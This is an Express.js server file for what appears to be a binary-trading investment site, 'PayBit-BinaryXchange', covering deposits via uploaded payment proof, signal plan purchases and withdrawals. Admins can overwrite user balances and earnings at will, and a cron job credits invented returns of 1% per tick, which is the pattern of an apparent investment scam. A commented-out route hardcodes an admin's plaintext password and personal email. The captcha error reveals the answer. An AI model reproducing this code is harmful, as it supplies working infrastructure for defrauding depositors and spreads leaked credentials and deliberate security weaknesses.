const express = require('express');
const bcrypt = require('bcrypt');
const cron = require('node-cron');
const nodemailer = require('nodemailer');
const crypto = require('crypto');
const path = require("path")
const fs = require("fs")
const multer = require("multer")
const initializePassport = require('./passport-config');
const passport = require('passport');
const session = require("express-session");
const flash = require("express-flash");
const mongoose = require("mongoose");
const User = require("./models/Users");
require('dotenv').config();
const emailConfig = JSON.parse(process.env.EMAIL_CONFIG || '{}');

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: emailConfig.user,
    pass: emailConfig.pass
  }
});
const app = express();

initializePassport(passport);

app.use(express.urlencoded({ extended: true}));
app.use(express.json())
app.use(express.static(path.join(__dirname, "public")))
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.set("trust proxy", 1);

mongoose.connect(process.env.MONGO_URI)

.then(() => console.log("MongoDB Atlas connected"))
.catch(err => console.error("MongoDB connection failed:", err));

mongoose.connection.on('connected', () => console.log('Mongoose connected to DB'));
mongoose.connection.on('error', (err) => console.log('Mongoose connection error:', err));

/*app.use(session({
  secret: process.env.SECRET_KEY || "render-session-secret",
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    sameSite: process.env.NODE_ENV === 'production' ? "none" : "lax"
   // maxAge: 1000 * 60 * 10 
  }
}));*/

const MongoStore = require('connect-mongo').default;

app.use(session({
  secret: emailConfig.secret || "fallback-secret",
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ mongoUrl: process.env.MONGO_URI }),
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
    maxAge: 1000 * 60 * 60
  }
}));

app.use(passport.initialize());
app.use(passport.session());
app.use(flash());

/*app.use((req, res, next) => {
  res.locals.success = req.flash('success');
  res.locals.error = req.flash('error');
  next();
});*/


/* ================= GLOBAL MIDDLEWARE ================= */
app.use((req, res, next) => {
  res.locals.user = req.user || null;
  res.locals.firstname = req.user?.firstname || '';
  res.locals.lastname = req.user?.lastname || '';
  res.locals.profilePic = req.user?.profilePic || '/img/profile/default.png';
  res.locals.success = req.flash('success');
  res.locals.error = req.flash('error');
  next();
});

function ensureAuth(req, res, next) {
  if (req.isAuthenticated()) return next();
  req.flash('error', 'Please log in first');
  res.redirect('/Dashboard/login');
}

/* ================= MULTER CONFIG ================= */
/* ================= MULTER CONFIG ================= */
const uploadDir = path.join(__dirname, 'public/img/profile');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    const userId = req.user ? req.user._id : 'guest';
    cb(null, `user-${userId}-${Date.now()}${ext}`);
  }
});

const fileFilter = (req, file, cb) => {
  const allowed = /jpeg|jpg|png|gif/;
  const ext = allowed.test(path.extname(file.originalname).toLowerCase());
  const mime = allowed.test(file.mimetype);
  if (ext && mime) cb(null, true);
  else cb(new Error('Only images allowed: jpg, png, gif'));
};

const upload = multer({ 
  storage, 
  fileFilter,
  limits: { fileSize: 2 * 1024 * 1024 } // 2MB max
});

/* ================= UPDATE PROFILE ================= */
app.post('/Dashboard/settings', ensureAuth, async (req, res) => {
  const { first, last, email, state, address } = req.body;
  
  try {
    await User.findByIdAndUpdate(req.user._id, {
      firstname: first,
      lastname: last,
      email,
      state,
      address
    });
    req.flash('success', 'Profile updated successfully');
    res.redirect('/Dashboard/settings');
  } catch (err) {
    console.log(err);
    req.flash('error', 'Update failed. Email might already exist');
    res.redirect('/Dashboard/settings');
  }
});

/* ================= CHANGE PASSWORD ================= */
app.post('/Dashboard/settings/password', ensureAuth, async (req, res) => {
  const { password, password1, password2 } = req.body;
  
  if (password1 !== password2) {
    req.flash('error', 'New passwords do not match');
    return res.redirect('/Dashboard/settings#cps');
  }
  
  try {
    const user = await User.findById(req.user._id);
    const isMatch = await bcrypt.compare(password, user.password);
    
    if (!isMatch) {
      req.flash('error', 'Old password is incorrect');
      return res.redirect('/Dashboard/settings#cps');
    }
    
    user.password = await bcrypt.hash(password1, 10);
    await user.save();
    req.flash('success', 'Password changed successfully');
    res.redirect('/Dashboard/settings#cps');
  } catch (err) {
    console.log(err);
    req.flash('error', 'Password change failed');
    res.redirect('/Dashboard/settings#cps');
  }
});

const svgCaptcha = require('svg-captcha');

app.get('/captcha', (req, res) => {
  let a = Math.floor(Math.random() * 9) + 1;
  let b = Math.floor(Math.random() * 9) + 1;
  const ops = ['+', '-', 'x'];
  const op = ops[Math.floor(Math.random() * 3)];
  
  if (op === '-' && a < b) [a, b] = [b, a];
  
  let answer = op === '+' ? a + b : op === '-' ? a - b : a * b;
  req.session.captcha = String(answer);
  
  // Force save session before sending image
  req.session.save(() => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="60">
      <rect width="100%" height="100%" fill="#f8f9fa" rx="6"/>
      <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" 
            font-size="28" font-family="Arial" fill="#333">${a} ${op} ${b} = ?</text>
    </svg>`;
    res.type('svg').send(svg);
  });
});

function verifyCaptcha(req, res, next) {
  const userInput = (req.body.captcha || '').trim();
  const realCaptcha = req.session.captcha;
  
  console.log('Session ID:', req.sessionID);
  console.log('Typed:', userInput, 'Answer:', realCaptcha);
  
  if (!userInput || userInput !== realCaptcha) {
    req.flash('error', `Wrong. You typed "${userInput}" but answer was "${realCaptcha}"`);
    return res.redirect(req.path.includes('login') ? '/Dashboard/login' : '/Dashboard/register');
  }
  req.session.captcha = null;
  next();
}

/* ================= UPLOAD PROFILE IMAGE ================= */
app.post('/Dashboard/settings/image', ensureAuth, upload.single('profile'), async (req, res) => {
  try {
    if (!req.file) {
      req.flash('error', 'No file selected');
      return res.redirect('/Dashboard/settings#cp');
    }
    
    const imagePath = `/img/profile/${req.file.filename}`;
    
    // Delete old image if not default
    if (req.user.profilePic && !req.user.profilePic.includes('default.png')) {
      const oldPath = path.join(__dirname, 'public', req.user.profilePic);
      if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
    }
    
    await User.findByIdAndUpdate(req.user._id, { profilePic: imagePath });
    req.flash('success', 'Profile image updated');
    res.redirect('/Dashboard/settings#cp');
  } catch (err) {
    console.log(err);
    req.flash('error', 'Image upload failed');
    res.redirect('/Dashboard/settings#cp');
  }
});

// Format: 2025/09/13 12:05pm
function formatTime(date = new Date()) {
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');
  
  let hours = date.getHours();
  const minutes = String(date.getMinutes()).padStart(2, '0');
  const ampm = hours >= 12 ? 'pm' : 'am';
  
  hours = hours % 12;
  hours = hours ? hours : 12; // 0 → 12
  hours = String(hours).padStart(2, '0');
  
  return `${year}/${month}/${day} ${hours}:${minutes}${ampm}`;
}

// Make it available on ALL pages
app.use((req, res, next) => {
  res.locals.now = formatTime(); // current time
  res.locals.formatTime = formatTime; // function to format any date
  next();
});

/* ================= LOGIN/REGISTER/LOGOUT ================= */
app.post("/register", verifyCaptcha, async (req, res) => {
  const { firstname, lastname, username, email, password, password2, mobile, referral, country, currency, account } = req.body;

  if (password !== password2) {
    req.flash("error", "Passwords do not match");
    return res.redirect("/Dashboard/register");
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    await User.create({ firstname, lastname, username, email, password: hashedPassword, mobile, referral, country, currency, account });
    req.flash("success", "Registered successfully. Please log in.");
    res.redirect("/Dashboard/login");
  } catch (err) {
    if (err.code === 11000) {
      req.flash("error", "Email/username already exists");
    } else {
      req.flash("error", "Registration failed. Try again.");
      console.log(err);
    }
    return res.redirect("/Dashboard/register");  
  }
});

app.post("/login", verifyCaptcha, passport.authenticate("local", {
  successRedirect: "/Dashboard/account",
  failureRedirect: "/Dashboard/login",
  failureFlash: true
}));

app.get("/Dashboard/logout", (req, res, next) => {
  req.logout(err => {
    if (err) return next(err);
    res.redirect("/Dashboard/login");
  });
});

// PUBLIC ROUTES - no auth needed
app.get('/test', (req, res) => res.send('Render server is working!'));
app.get('/', (req, res) => res.render('index'));
app.get('/home', (req, res) => res.render('home'));
app.get('/faq', (req, res) => res.render('faq'));
app.get('/terms', (req, res) => res.render('terms'));
app.get('/privacy', (req, res) => res.render('privacy'));
app.get('/contact', (req, res) => res.render('contact'));
app.get('/about', (req, res) => res.render('about'));
app.get('/demo', (req, res) => res.render('demo'));

/* ================= DASHBOARD ROUTES ================= */
app.get('/Dashboard/login', (req, res) => res.render('Dashboard/login'));
app.get('/Dashboard/register', (req, res) => res.render('Dashboard/register'));

app.get('/Dashboard/deposit', ensureAuth, async (req, res) => {
  const user = await User.findById(req.user._id);
  res.render('Dashboard/deposit', { user });
});

app.post('/Dashboard/deposit', ensureAuth, async (req, res) => {
  console.log('POST BODY:', req.body);
  let amount = Number(req.body?.plan); 
  console.log('Amount received:', amount); 
  if (!amount || isNaN(amount) || amount < 10) {
    req.flash('error', 'Minimum deposit is £10');
    return res.redirect('/Dashboard/deposit');
  }
  
  req.session.pendingDeposit = { 
    amount: amount,
    currency: req.user.currency || '£'
  };

  try {
    await User.findByIdAndUpdate(req.user._id, {
      $push: {
        transactions: { 
          type: 'Deposit', 
          amount: amount, 
          currency: req.user.currency || '£',
          date: new Date(), 
          status: 'Pending' 
        }
      }
    });

    // Force save session before redirect
    req.session.save((err) => {
      if (err) console.log('Session save error:', err);
      req.flash('success', `Deposit of ${req.user.currency || '£'}${amount} initiated. Complete the payment and upload payment proof.`);
      res.redirect('/Dashboard/payment');
    });

  } catch (err) {
    console.log(err);
    req.flash('error', 'Deposit failed');
    res.redirect('/Dashboard/deposit');
  }
});

app.get('/Dashboard/home', ensureAuth, (req, res) => res.render('Dashboard/home'));

app.get('/Dashboard/history', ensureAuth, async (req, res) => {
  const user = await User.findById(req.user._id);
  res.render('Dashboard/history', { user, formatTime: res.locals.formatTime });
});

app.get('/Dashboard/index', ensureAuth, (req, res) => res.render('Dashboard/index'));
app.get('/Dashboard/info', ensureAuth, (req, res) => res.render('Dashboard/info'));


app.get('/Dashboard/payment', ensureAuth, (req, res) => {
  res.render('Dashboard/payment', { 
    pendingDeposit: req.session.pendingDeposit || null,
    pendingSignal: req.session.pendingSignal || null
  });
});


app.post('/Dashboard/payment', ensureAuth, upload.single('file'), async (req, res) => {
  try {
    const pendingDeposit = req.session.pendingDeposit;
    const pendingSignal = req.session.pendingSignal;

    if (!req.file) {
      req.flash('error', 'Upload payment proof');
      return res.redirect('/Dashboard/payment');
    }

    const proofPath = `/img/profile/${req.file.filename}`;

    // 1. HANDLE DEPOSIT - NO BALANCE UPDATE HERE
    if (pendingDeposit) {
      const amount = Number(pendingDeposit.amount);
      const currency = pendingDeposit.currency || req.user.currency || '£';

      if (!amount || isNaN(amount) || amount < 10) {
        req.flash('error', 'Invalid deposit amount');
        return res.redirect('/Dashboard/deposit');
      }

      // Only save proof + keep status Pending. NO $inc
      const result = await User.findOneAndUpdate(
        {
          _id: req.user._id,
          "transactions.type": "Deposit",
          "transactions.status": "Pending"
        },
        {
          $set: {
            "transactions.$.proof": proofPath,
            "transactions.$.status": "Pending", // stays Pending until you approve
            "transactions.$.currency": currency
          }
        },
        { sort: { "transactions.date": -1 }, new: true }
      );

      if (!result) {
        req.flash('error', 'Deposit record not found. Start again.');
        return res.redirect('/Dashboard/deposit');
      }

      req.session.pendingDeposit = null;
      req.flash('success', `Deposit proof uploaded for ${currency}${amount}. Awaiting admin confirmation.`);
      return res.redirect('/Dashboard/account');
    }

    // 2. HANDLE SIGNAL PURCHASE
    if (pendingSignal) {
      const amount = Number(pendingSignal.amount);
      const currency = pendingSignal.currency || req.user.currency || '£';

      await User.findByIdAndUpdate(req.user._id, {
        $push: {
          account: pendingSignal.invest,
          transactions: {
            type: 'Signal',
            plan: pendingSignal.invest,
            amount: amount,
            currency: currency,
            proof: proofPath,
            date: new Date(),
            status: 'Pending'
          }
        }
      });

      req.session.pendingSignal = null;
      req.flash('success', `Signal ${pendingSignal.invest} submitted. Awaiting confirmation.`);
      return res.redirect('/Dashboard/account');
    }

    req.flash('error', 'Session expired. Start deposit again');
    res.redirect('/Dashboard/deposit');

  } catch (err) {
    console.error('Payment POST error:', err);
    req.flash('error', 'Something went wrong. Try again.');
    res.redirect('/Dashboard/payment');
  }
});

app.get('/Dashboard/settings', ensureAuth, (req, res) => res.render('Dashboard/settings'));
app.get('/Dashboard/signal', ensureAuth, (req, res) => res.render('Dashboard/signal'));

app.post('/Dashboard/signal', ensureAuth, (req, res) => {
  const { invest, name, email } = req.body;
  req.session.pendingSignal = { invest, name, email, amount: invest.match(/\d+/)?.[0] || '0' };
  res.redirect('/Dashboard/payment');
});

app.get('/Dashboard/account', ensureAuth, (req, res) => res.render('Dashboard/account'));


app.get('/Dashboard/withdraw', ensureAuth, async (req, res) => {
  const user = await User.findById(req.user._id);
  res.render('Dashboard/withdraw', { user });
});

app.post('/Dashboard/withdraw', ensureAuth, async (req, res) => {
  const { amount, method, ...details } = req.body;
  const amountNum = Number(amount);

  if (!amountNum || amountNum < 10) {
    req.flash('error', 'Minimum withdrawal is £10');
    return res.redirect('/Dashboard/withdraw');
  }

  if (amountNum > req.user.balance) {
    req.flash('error', 'Insufficient balance');
    return res.redirect('/Dashboard/withdraw');
  }

  try {
    await User.findByIdAndUpdate(req.user._id, {
      $push: {
        transactions: {
          type: 'Withdrawal',
          amount: amountNum,
          currency: req.user.currency || '£',
          method: method,
          details: details,
          date: new Date(),
          status: 'Pending'
        }
      }
    });

    req.flash('success', `Withdrawal request of ${req.user.currency || '£'}${amountNum} via ${method} submitted. Awaiting admin approval.`);
    res.redirect('/Dashboard/account');
  } catch (err) {
    console.log(err);
    req.flash('error', 'Withdrawal failed');
    res.redirect('/Dashboard/withdraw');
  }
});

app.get('/Dashboard/transaction', ensureAuth, async (req, res) => {
  const user = await User.findById(req.user._id);
  res.render('Dashboard/transaction', { user, formatTime: res.locals.formatTime });
});

app.get('/Dashboard/upgrade', ensureAuth, (req, res) => res.render('Dashboard/upgrade'));
app.post('/Dashboard/upgrade', ensureAuth, (req, res) => {
  const { plan } = req.body;
  req.session.pendingSignal = { invest: plan, amount: plan.match(/\d+/)?.[0] || '0' };
  res.redirect('/Dashboard/payment');
});

/*app.get('/make-admin-secret-xyz123', async (req, res) => {
  const hash = await bcrypt.hash('@supreme3010', 10);
  await User.create({firstname:"Robert", username:"supremeeternalgodemperror", email:"robertbrown0297@gmail.com", password:hash, role:"admin"});
  res.send('Admin created');
});*/



app.get('/Dashboard/admin/users', ensureAuth, ensureAdmin, async (req, res) => {
  const users = await User.find({}, 'firstname lastname email balance totalDeposit totalBonus totalEarning createdAt role profilePic transactions');
  res.render('Dashboard/admin/users', { users, formatTime: res.locals.formatTime });
});


  
function ensureAdmin(req, res, next) {
  if (req.isAuthenticated() && req.user.role === 'admin') return next();
  req.flash('error', 'Access denied');
  res.redirect('/login');
}

app.post('/Dashboard/admin/approve/:userId/:txId', ensureAuth, ensureAdmin, async (req, res) => {
  try {
    const { userId, txId } = req.params;
    
    // Find user + pending tx
    const user = await User.findOne({ 
      _id: userId, 
      "transactions._id": txId, 
      "transactions.status": "Pending" 
    });
    
    if (!user) {
      req.flash('error', 'Transaction not found or already approved');
      return res.redirect('/Dashboard/admin/users');
    }
    
    const tx = user.transactions.id(txId);
    
    // Update tx status + add to balance
    await User.updateOne(
      { _id: userId, "transactions._id": txId },
      { 
        $set: { 
          "transactions.$.status": "Completed", 
          "transactions.$.approvedAt": new Date(),
          hasActiveDeposit: true  
        },
        $inc: { 
          balance: tx.amount, 
          totalDeposit: tx.amount 
        }
      }
    );
    
    req.flash('success', `Approved deposit of ${tx.currency}${tx.amount}`);
    res.redirect('/Dashboard/admin/users');
  } catch (err) {
    console.log(err);
    req.flash('error', 'Approve failed');
    res.redirect('/Dashboard/admin/users');
  }
});

app.post('/Dashboard/admin/users/update', ensureAuth, ensureAdmin, async (req, res) => {
  try {
    const { userId, balance, totalDeposit, totalBonus, totalEarning } = req.body;
    
    await User.findByIdAndUpdate(userId, {
      balance: parseFloat(balance) || 0,
      totalDeposit: parseFloat(totalDeposit) || 0,
      totalBonus: parseFloat(totalBonus) || 0,
      totalEarning: parseFloat(totalEarning) || 0
    });
    
    req.flash('success', 'User balance updated successfully');
    res.redirect('/Dashboard/admin/users');
  } catch (err) {
    console.log(err);
    req.flash('error', 'Update failed');
    res.redirect('/Dashboard/admin/users');
  }
});

app.get('/Dashboard/forgot', ensureAuth, (req, res) => res.render('Dashboard/forgot'));

/*const crypto = require('crypto');
const nodemailer = require('nodemailer');
const User = require('./Users'); // adjust path if needed

// Create transporter - use Gmail or any SMTP
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER, // your gmail
    pass: process.env.EMAIL_PASS  // app password, not normal password
  }
});*/

// POST /Dashboard/forgot-password
app.post('/Dashboard/forgot-password', async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email: email.toLowerCase() });
    
    if (!user) {
      return res.render('forgot-password', { error: 'No account with that email exists' });
    }

    // Generate reset token
    const token = crypto.randomBytes(32).toString('hex');
    user.resetToken = token;
    user.resetTokenExpiry = Date.now() + 3600000; // 1 hour
    await user.save();

    // Send email
    const resetUrl = `${req.protocol}://${req.get('host')}/Dashboard/reset-password/${token}`;
    
    await transporter.sendMail({
      to: user.email,
      from: `"PayBit Support" <${emailConfig.user}>`,
      subject: 'Password Reset - PayBit-BinaryXchange',
      html: `
        <p>You requested a password reset</p>
        <p>Click this link to reset: <a href="${resetUrl}">Reset Password</a></p>
        <p>Link expires in 1 hour</p>
        <p>If you didn’t request this, ignore this email.</p>
      `
    });

    res.render('forgot-password', { success: 'Reset link sent to your email' });
  } catch (err) {
    console.log(err);
    res.render('forgot-password', { error: 'Something went wrong' });
  }
});

// GET /Dashboard/reset-password/:token
app.get('/Dashboard/reset-password/:token', async (req, res) => {
  const user = await User.findOne({
    resetToken: req.params.token,
    resetTokenExpiry: { $gt: Date.now() }
  });
  
  if (!user) {
    return res.send('Reset link invalid or expired');
  }
  
  res.render('reset-password', { token: req.params.token });
});

// POST /Dashboard/reset-password/:token
app.post('/Dashboard/reset-password/:token', async (req, res) => {
  const user = await User.findOne({
    resetToken: req.params.token,
    resetTokenExpiry: { $gt: Date.now() }
  });
  
  if (!user) {
    return res.send('Reset link invalid or expired');
  }
  
  user.password = await bcrypt.hash(req.body.password, 10); 
  user.resetToken = undefined;
  user.resetTokenExpiry = undefined;
  await user.save();
  
  res.send('Password updated. <a href="/Dashboard/login">Login</a>');
});


cron.schedule('*/10 *', async () => {
  console.log('--- CRON TICK ---', new Date().toLocaleTimeString());
    
    try {
        const users = await User.find({ hasActiveDeposit: true });
        console.log('Users found with hasActiveDeposit:true:', users.length);
        
        for (let user of users) {
            const rate = 0.01; // 1% per min for testing
            
            const lastDeposit = user.transactions
               .filter(t => t.type === 'Deposit' && t.status === 'Completed')
               .sort((a,b) => new Date(b.date) - new Date(a.date))[0];

            if (!lastDeposit) {
                console.log('No completed deposit for', user.email);
                continue;
            }

            const earningPerMin = lastDeposit.amount * rate;
            console.log(`Updating ${user.email}: +${earningPerMin}`);

            const result = await User.findByIdAndUpdate(user._id, {
                $inc: { totalEarning: earningPerMin, balance: earningPerMin }
            }, { new: true });

            console.log('New balance:', result.balance, 'New earning:', result.totalEarning);
        }
    } catch (err) {
        console.error('Cron error:', err);
    }
});
console.log('Earning cron job started - runs every 1 minute');

const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

app.use((req, res) => res.status(404).render('404'));
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

//git add .
//git commit -m "add withdrawal methods + fix withdraw page"
//git push origin main